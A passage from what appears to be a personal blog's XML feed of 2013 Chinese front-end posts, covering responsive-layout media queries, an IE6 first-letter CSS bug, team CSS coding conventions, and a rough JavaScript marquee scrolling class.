inline-block;</span><br><span class="line">        <span class="attribute">margin-bottom</span>: <span class="number">15px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#skyking-footer</span> <span class="selector-tag">p</span> &#123;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">text-indent</span>: <span class="number">2em</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">min-width</span>: <span class="number">481px</span>) <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">699px</span>) &#123;</span><br><span class="line">    <span class="selector-tag">html</span>, <span class="selector-tag">body</span> &#123;</span><br><span class="line">        <span class="attribute">background</span>: none;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">ul</span><span class="selector-id">#topMnu</span>,</span><br><span class="line">    <span class="selector-tag">a</span><span class="selector-class">.minyx</span>,</span><br><span class="line">    <span class="selector-id">#rss</span> &#123;</span><br><span class="line">        <span class="attribute">display</span>: none;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-id">#container</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">96%</span>;</span><br><span class="line">        <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">2%</span>;</span><br><span class="line">        <span class="attribute">min-width</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-id">#content</span> &#123;</span><br><span class="line">        <span class="attribute">margin-right</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">float</span>: none;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-id">#sidebar</span> &#123;</span><br><span class="line">        <span class="attribute">margin-left</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">        <span class="attribute">float</span>: none;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#about</span> &#123;</span><br><span class="line">        <span class="attribute">position</span>: static;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.commentbox_title</span>,</span><br><span class="line">    <span class="selector-id">#tbCommentBody</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">96%</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#skyking-footer</span> &#123;</span><br><span class="line">        <span class="attribute">margin-top</span>: <span class="number">30px</span>;</span><br><span class="line">        <span class="attribute">padding</span>: <span class="number">15px</span> <span class="number">20px</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#skyking-footer</span> <span class="selector-tag">div</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#skyking-footer</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">        <span class="attribute">float</span>: none;</span><br><span class="line">        <span class="attribute">border</span>: none;</span><br><span class="line">        <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">        <span class="attribute">display</span>: inline-block;</span><br><span class="line">        <span class="attribute">margin-bottom</span>: <span class="number">15px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#skyking-footer</span> <span class="selector-tag">p</span> &#123;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">text-indent</span>: <span class="number">2em</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#div_digg</span> &#123;</span><br><span class="line">        <span class="attribute">right</span>: <span class="number">15px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">min-width</span>: <span class="number">700px</span>) <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">960px</span>) &#123;</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-id">#container</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">96%</span>;</span><br><span class="line">        <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">2%</span>;</span><br><span class="line">        <span class="attribute">min-width</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#wrapper</span> &#123;</span><br><span class="line">        <span class="attribute">overflow-x</span>:hidden;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#skyking-footer</span> <span class="selector-tag">div</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#skyking-footer</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">        <span class="attribute">float</span>: left;</span><br><span class="line">        <span class="attribute">margin-bottom</span>: <span class="number">15px</span>;</span><br><span class="line">        <span class="attribute">margin-left</span>: <span class="number">1%</span>;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">22%</span>;</span><br><span class="line">        <span class="attribute">min-height</span>: <span class="number">120px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-id">#sidebar</span> <span class="selector-tag">div</span><span class="selector-id">#sideRight</span>,</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-id">#sidebar</span> <span class="selector-tag">div</span><span class="selector-id">#sideLeft</span> &#123;</span><br><span class="line">        <span class="attribute">float</span>: none;</span><br><span class="line">        <span class="attribute">width</span>: auto;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-id">#content</span> &#123;</span><br><span class="line">        <span class="attribute">margin-right</span>: <span class="number">32%</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-id">#sidebar</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">30%</span>;</span><br><span class="line">        <span class="attribute">margin-left</span>: -<span class="number">30%</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#about</span> &#123;</span><br><span class="line">        <span class="attribute">position</span>: static;</span><br><span class="line">        <span class="attribute">display</span>:none;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#div_digg</span> &#123;</span><br><span class="line">        <span class="attribute">right</span>: <span class="number">15px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">meida query</span><br></pre></td></tr></table></figure><h3>小结</h3><p><span>　　响应式布局是这几年很流行的一个设计理念，随着移动互联网的盛行，为解决如今各式各样的浏览器分辨率以及不同移动设备的显示效果，响应式布局显得十分重要。设计虽好，我觉得也存在诸如一下的一些<span><strong>弊端</strong></span>：</span></p><p><span>　　1. 页面需要加载更多额外的内容，比如我们的手机看这个页面的话，体验效果还行，但是那些次要的内容依然被加载进来了，没看看见是因为被我display:none给隐藏了。</span><span>所以，如果想得到好的用户体验，同时节省流量的话，应该在加载之前做一些判断。</span></p><p><span>　　<span>2. 还是存在兼容性问题，要知道，现在IE6-8所占的市场份额仍然在40%+，这么庞大的用户群我们暂时是不能忽略的，若引用其他的JS来矫正，这个太费资源，不可取，而且事实表明这些JS并不好用。</span></span></p><p>P.S：本文图片都是直接截屏，没有做优化处理，整个页面体积过于庞大，看来图片的优化和lazyload很有必要啊！！！下次弄一个简洁版的lazyload用用~~</p><p>&nbsp;最后。。。来一张萌图，哈哈哈~</p><p><img src="https://images.cnitblog.com/blog/387325/201308/11124011-2bb20347825f45139a41031f0fde7b22.gif" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IE6的一个小bug</title>
      <link href="/blog/2013/08/09/cb-css-bug-in-IE6/"/>
      <url>/blog/2013/08/09/cb-css-bug-in-IE6/</url>
      
        <content type="html"><![CDATA[<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;//www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">&quot;//www.w3.org/1999/xhtml&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="comment">&lt;!--</span></span></span><br><span class="line"><span class="comment"><span class="language-xml">    p&#123;font-size:12px;&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-xml">    p:first-letter&#123;font-size:300%&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-xml">    --&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>对于世界而言，你是一个人；但是对于某个人，你是他的整个世界。纵然伤心，也不要愁眉不展，因为你不知是谁会爱上你的笑容。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>这段代码对&lt;p&gt;的首字符样式定义在IE6上看是没有效果的,而在p:first-letter和{font-size:300%}加上空格，也就是p:first-letter {font-size:300%}后，显示就正常了。&nbsp;</span><span>这个问题主要是出现在IE6浏览器中，而且这位朋友也说明了一些必要的触发条件：&nbsp;</span><span>1、IE6浏览器&nbsp;</span><span>2、选择符是带有伪类的&nbsp;</span><span>3、伪类中必须是有连接符\-"的，例如:first-letter&nbsp;</span><span>4、是否有空格的存在</span></p><p><span>本文转自：<a href="http://www.jb51.net/web/20615.html">http://www.jb51.net/web/20615.html</a></span></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 剪贴板 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 兼容性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端编码规范之CSS</title>
      <link href="/blog/2013/08/09/cb-css-spec/"/>
      <url>/blog/2013/08/09/cb-css-spec/</url>
      
        <content type="html"><![CDATA[<p>　　"字是门面书是屋"，我们不会去手写代码，但是敲出来的代码要好看、有条理，这还必须得有一点约束~</p><p>　　团队开发中，每个人的编码风格都不尽相同，有时候可能存在很大的差异，为了便于压缩组件对代码进行压缩以及书写样式的规范统一和美观，很有必要大家一起来研究一套基本规范（模板）！</p><p>　　我先抛砖引玉。<strong><span>（禁止）、（必须）<span>等字眼，在这里只是<span>表示强调，未严格要求</span>。</span></span></strong></p><h3>前端规范之CSS</h3><p><strong>1. <span>tab</span>键用<span>（必须）</span><span>四个空格</span>代替</strong></p><p>　　<span>因为在不同系统的编辑工具对tab解析不一样，windows下的tab键是占四个空格的位置，而在linux下会变成占八个空格的位置（除非你自己设定了tab键所占的位置长度）。</span></p><p>　　一些童鞋可能会有疑问，tab键换成四个空格，多麻烦啊~</p><p>　　其实不然，我平时用sublime text比较多，在这个工具中可以对tab键进行设置。</p><p><img src="https://images.cnitblog.com/blog/387325/201308/09141737-747feb02ee5140f8956f9b70ce9f1aae.png" alt=""></p><p>　　选择Indent Using Spaces，Tab Width：4两项即可。</p><p><strong>2. 每个样式属性后<span><strong>（必须）</strong></span>加 "<span>;<span>"</span></span></strong></p><p>方便压缩工具"断句"。</p><p><strong><span><span>3. Class命名中<span>（禁止）</span>出现大写字母，<span>（必须）</span>采用"<span> -</span> \对class中的字母分隔，如：</span></span></strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 正确的写法 */</span></span><br><span class="line"><span class="selector-class">.hotel-title</span> &#123;</span><br><span class="line">    <span class="attribute">font-weight</span>: bold;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 不推荐的写法 */</span></span><br><span class="line"><span class="selector-class">.hotelTitle</span> &#123;</span><br><span class="line">    <span class="attribute">font-weight</span>: bold;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>用"-"隔开比使用驼峰是更加清晰。</li><li>产品线-产品-模块-子模块，命名的时候也可以使用这种方式（@Artwl）</li></ul><p><strong>4. 空格的使用，以下规则<span>（必须）</span>执行：</strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.hotel-content</span> &#123;</span><br><span class="line">    <span class="attribute">font-weight</span>: bold;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>选择器与&nbsp;<span><code>&#123;&nbsp;</code></span>之前<span>（<code>必须）</code></span>要有空格</li><li>属性名的&nbsp;<span><code>:&nbsp;</code></span>后<span>（<code>必须）</code></span>要有空格</li><li>属性名的&nbsp;<span><code>:&nbsp;</code></span>前<span>（<code>禁止）</code></span>加空格</li></ul><p>一个原因是美观，其次IE 6存在一个bug， 戳<a href="http://www.cnblogs.com/hustskyking/articles/css-bug-in-IE6.html" target="_blank">bug</a></p><p><strong>5.多选择器规则之间<span>（<code>必须）</code></span>换行</strong></p><p>当样式针对多个选择器时每个选择器占一行</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 推荐的写法 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.btn</span>,</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-class">.btn</span>,</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;button&quot;</span>]</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>6. <span>（<code>禁止）</code></span><span>将样式写为单行, 如</span></strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.hotel-content</span> &#123;<span class="attribute">margin</span>: <span class="number">10px</span>; <span class="attribute">background-color</span>: <span class="number">#efefef</span>;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>单行显示不好注释，不好备注，这应该是压缩工具的活儿~</p><p><strong>7. <span>（<code>禁止）</code></span><span>向&nbsp;</span><span><code>0&nbsp;</code></span><span>后添加单位, 如：</span></strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.obj</span> &#123;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>只是为了统一。记住，绿色字表强调，不表强制！</p><p><strong>8. <span>（<code>禁止）</code></span>使用css原生<code>import</code></strong></p><p>使用css原生import有很多弊端，比如会增加请求数等....</p><p><strong>推荐文章</strong>：<a href="http://www.stevesouders.com/blog/2009/04/09/dont-use-import/" target="_blank">Don't use @import</a></p><p><strong>9. <span>（<code>推荐）</code></span>属性的书写顺序, 举个例子:</strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.hotel-content</span> &#123;</span><br><span class="line">     <span class="comment">/* 定位 */</span></span><br><span class="line">     <span class="attribute">display</span>: block;</span><br><span class="line">     <span class="attribute">position</span>: absolute;</span><br><span class="line">     <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">     <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">     <span class="comment">/* 盒模型 */</span></span><br><span class="line">     <span class="attribute">width</span>: <span class="number">50px</span>;</span><br><span class="line">     <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">     <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">     <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span><br><span class="line">     / *其他* /</span><br><span class="line">     <span class="attribute">color</span>: <span class="number">#efefef</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>定位相关, 常见的有：<code>display</code>&nbsp;<code>position</code>&nbsp;<code>left</code>&nbsp;<code>top</code>&nbsp;<code>float</code>&nbsp;等</li><li>盒模型相关, 常见的有：<code>width</code>&nbsp;<code>height</code>&nbsp;<code>margin</code>&nbsp;<code>padding</code>&nbsp;<code>border</code>&nbsp;等</li><li>其他属性</li></ul><p>&nbsp;　 &nbsp;<span>按照这样的顺序书写可见提升浏览器渲染dom的性能</span></p><p><span>　　简单举个例子，网页中的图片，如果没有设置width和height，在图片载入之前，他所占的空间为0，但是当他加载完毕之后，那块为0的空间突然被撑开了，这样会导致，他下面的元素重新排列和渲染，造成重绘（repaint）和回流（reflow）。我们在写css的时候，把元素的定位放在前头，首先让浏览器知道该元素是在文本流内还是外，具体在页面的哪个部位，接着让浏览器知道他们的宽度和高度，border等这些占用空间的属性，其他的属性都是在这个固定的区域内渲染的，差不多就是这个意思吧~(@frec)</span></p><p><span><strong>&nbsp;推荐文章</strong>：</span><a href="http://css-tricks.com/poll-results-how-do-you-order-your-css-properties/" target="_blank">Poll Results: How do you order your CSS properties?</a></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a href="http://www.mozilla.org/css/base/content.css" target="_blank">http://www.mozilla.org/css/base/content.css</a></p><p><strong>10. 小图片<span>（必须）</span><span>sprite</span> 合并</strong></p><p><strong>推荐文章</strong>：<a class="blogTitle btitle" title="NodeJs智能合并CSS精灵图工具iSpriter" href="http://www.alloyteam.com/2012/09/update-ispriter-smart-merging-css-sprite/" rel="bookmark" target="_blank">NodeJs智能合并CSS精灵图工具iSpriter</a></p><p><strong>11. <span>（<code>推荐）</code></span><span>当编写针对特定<span>html</span>结构的样式时，使用</span><span><code>元素名</code></span><span>&nbsp;+<span>&nbsp;</span></span><span><code>类名</code></span></strong></p><figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 所有的nav都是针对ul编写的 */</span></span><br><span class="line"> ul.nav &#123;</span><br><span class="line">     <span class="params">...</span><span class="params">...</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>".a div"和".a div.b"，为什么后者好？如果需求有所变化，在".a"下有多加了一个div，试问，开始的样式是不是会影响后来的div啊~</p><p><span><strong>12. <span>（推荐）</span>IE Hack List</strong></span></p><figure class="highlight qml"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 针对ie的hack */</span></span><br><span class="line"><span class="title">selector</span> &#123;</span><br><span class="line">    <span class="keyword">property</span><span class="string"></span>: value;     <span class="comment">/* 所有浏览器 */</span></span><br><span class="line">    <span class="keyword">property</span><span class="string"></span>: value\<span class="number">9</span>;   <span class="comment">/* 所有IE浏览器 */</span></span><br><span class="line">    <span class="keyword">property</span><span class="string"></span>: value\<span class="number">0</span>;   <span class="comment">/* IE8 */</span></span><br><span class="line">    +<span class="keyword">property</span><span class="string"></span>: value;    <span class="comment">/* IE7 */</span></span><br><span class="line">    <span class="attribute">_property</span>: value;    <span class="comment">/* IE6 */</span></span><br><span class="line">    *<span class="keyword">property</span><span class="string"></span>: value;    <span class="comment">/* IE6-7 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>当使用hack的时候想想能不能用更好的样式代替</span></p><p><strong>13. <span>（<code>不推荐）</code></span><span>ie使用</span><span><code>filter</code></span><span>,<span>（&nbsp;</span></span><span><code>禁止）</code></span><span>使用</span><span><code>expression</code></span></strong></p><p>这里主要是效率问题，应该当格外注意，咱们要少用烧CPU的东西~&nbsp;</p><p><strong>14. <span>（禁止）</span>使用<span>行内（inline）</span>样式</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Barret Lee<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>像这样的行内样式，最好用一个class代替。又如要隐藏某个元素，可以给他加一个class</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.hide</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尽量做到样式和结构分离~</p><p><strong>15. <span>（推荐）</span>reset.css样式</strong></p><p><strong>推荐网站：<a href="http://www.cssreset.com/" target="_blank">http://www.cssreset.com/</a></strong></p><p><strong>16.<span>（禁止）</span>使用"<span>*</span>"来选择元素</strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*别这样写*/</span></span><br><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样写是没有必要的，一些元素在浏览器中默认有margin或padding值，但是只是部分元素，没有必要将所有元素的margin、padding值都置为0。</p><p><strong>17. 链接的样式，<span>（务必）</span>按照这个顺序来书写</strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:link</span> -&gt; <span class="selector-tag">a</span><span class="selector-pseudo">:visited</span> -&gt; <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> -&gt; <span class="selector-tag">a</span><span class="selector-pseudo">:active</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>18. <span>等</span><span>你补充...</span></strong><span>&nbsp;</span></p><h3>应该说在前面的话</h3><ul><li>对于不同的团队、不同的需求，编码规范上有一些差异，这个很正常。</li><li>最后上线的代码肯定不是上述遵从规范的，上线的代码都会经过打包和压缩。</li><li>不同的人有不同的编码风格，当你是一个人作战的时候，你可以不用考虑这些，但是如果是团队开发，有一个规范还是很有指导价值的~</li></ul><p>　　这些规范是在团队开发过程中，集思广益总结出来的，不是很全面，<strong><span>如果你有好的建议，请提出来，我们一起打造一个良好的前端生态环境！</span></strong></p><p>　　后面我会陆续把HTML、JavaScript和LESS等规范罗列出来，大家共同进步！！！</p><p><strong>相关阅读：</strong><a href="http://www.cnblogs.com/hustskyking/p/javascript-spec.html" target="_blank">前端编码规范之JavaScript</a></p><p>&nbsp;&nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个不陌生的JS效果-marquee,用css3来实现</title>
      <link href="/blog/2013/07/26/cb-marquee-in-javascript/"/>
      <url>/blog/2013/07/26/cb-marquee-in-javascript/</url>
      
        <content type="html"><![CDATA[<p>关于marquee，就不多说了，可以<a title="marquee演示" href="http://qianduannotes.sinaapp.com/marquee/show.html" target="_blank">戳这里</a>。</p><p>毕竟他是一个很古老的元素，现在的标准里头也不推荐使用这个标签了。但平时一些项目中会经常碰到这样的效果，每次都是重新写一遍，麻烦！</p><h3>JS类实现marquee</h3><p>今天倒弄了一个<strong>类</strong>，还不全，打个草稿吧~ 下次就凑合着用吧。</p><p>DEMO在这里，<a title="DEMO" href="http://qianduannotes.sinaapp.com/marquee/index.html" target="_blank">戳我</a></p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> 靖鸣君</span></span><br><span class="line"><span class="comment">* <span class="doctag">@email</span> jingmingjun92@163.com</span></span><br><span class="line"><span class="comment">* <span class="doctag">@description</span> 滚动</span></span><br><span class="line"><span class="comment">* <span class="doctag">@class</span> Marquee</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> &#123;Object&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> Marquee = function()&#123;</span><br><span class="line">    <span class="keyword">this</span>.direction = <span class="string">&quot;top&quot;</span>;</span><br><span class="line">    <span class="keyword">this</span>.speed = <span class="number">30</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Marquee.prototype = &#123;</span><br><span class="line">    <span class="comment">//initial</span></span><br><span class="line">    <span class="keyword">init</span>: function(obj, setttings)&#123;</span><br><span class="line">        <span class="keyword">this</span>.obj = obj;</span><br><span class="line">        <span class="keyword">this</span>._createBox();</span><br><span class="line">        <span class="keyword">this</span>.scroll();</span><br><span class="line">        <span class="keyword">if</span>(settings)&#123;</span><br><span class="line">            settings.direction &amp;&amp; (<span class="keyword">this</span>.direction = settings.direction);</span><br><span class="line">            settings.speed &amp;&amp; (<span class="keyword">this</span>.speed = settings.speed);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    _createBox: function()&#123;</span><br><span class="line">        <span class="comment">//create inner box A</span></span><br><span class="line">        <span class="keyword">this</span>.iBox = document.createElement(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> iBox = <span class="keyword">this</span>.iBox;</span><br><span class="line">        with(iBox.style)&#123;</span><br><span class="line">            width = <span class="string">&quot;100%&quot;</span>;</span><br><span class="line">            height = <span class="string">&quot;100%&quot;</span>;</span><br><span class="line">            overflow = <span class="string">&quot;hidden&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        iBox.setAttribute(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;marqueeBoxA&quot;</span>);</span><br><span class="line">        iBox.innerHTML = obj.innerHTML;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//clone inner box B</span></span><br><span class="line">        <span class="keyword">var</span> iBox2 = iBox.cloneNode(<span class="literal">true</span>);</span><br><span class="line">        iBox2.setAttribute(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;marqueeBoxB&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//append to obj Box</span></span><br><span class="line">        <span class="keyword">this</span>.obj.innerHTML = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">this</span>.obj.appendChild(iBox);</span><br><span class="line">        <span class="keyword">this</span>.obj.appendChild(iBox2);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//animation</span></span><br><span class="line">    scroll: function() &#123;</span><br><span class="line">        <span class="keyword">var</span> _self = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">this</span>.timer = setInterval(function()&#123;</span><br><span class="line">            _self._ani();</span><br><span class="line">        &#125;, <span class="keyword">this</span>.speed);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//setInterval function</span></span><br><span class="line">    _ani: function() &#123;</span><br><span class="line">        <span class="keyword">if</span>(obj.clientHeight - obj.scrollTop &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">            obj.scrollTop = obj.offsetHeight - obj.scrollTop + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            obj.scrollTop++;</span><br><span class="line">            console.log(obj.offsetHeight, obj.scrollTop);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    stop: function()&#123;</span><br><span class="line">        clearInterval(<span class="keyword">this</span>.timer);</span><br><span class="line">    &#125;,</span><br><span class="line">    start: function()&#123;</span><br><span class="line">        <span class="keyword">this</span>.scroll();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>gists地址：<a href="//gist.github.com/barretlee/6095976">//gist.github.com/barretlee/6095976</a></p><p>代码写的比较粗糙，下面说说这个<strong>思路</strong>：</p><p><img src="https://images.cnitblog.com/blog/387325/201307/26221029-f82024416caf481a91ad51b1576d33d0.jpg" alt=""></p><p>BoxA和BoxB内容相同，当BoxA滚动离开外层盒子时，把scrollTop设置成，当前的scrollTop - BoxA的高度，记得再加上一个1.</p><p>思路很简单，操作也很方便，我比较习惯用scrollTop来控制移动，有的人也喜欢用绝对定位和相对定位配合，但是这样写出来的插件兼容性不是很好，有些页面定位元素太多，可能会造成插件的样式乱套。</p><p>这个插件（楼主比较懒，还没有写完）的<strong>使用方式</strong>：</p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> marquee = <span class="keyword">new</span> Marquee(),</span><br><span class="line">    obj = document.getElementById(<span class="string">&quot;box&quot;</span>);</span><br><span class="line"></span><br><span class="line">marquee.<span class="keyword">init</span>(obj);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对应的html代码：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">   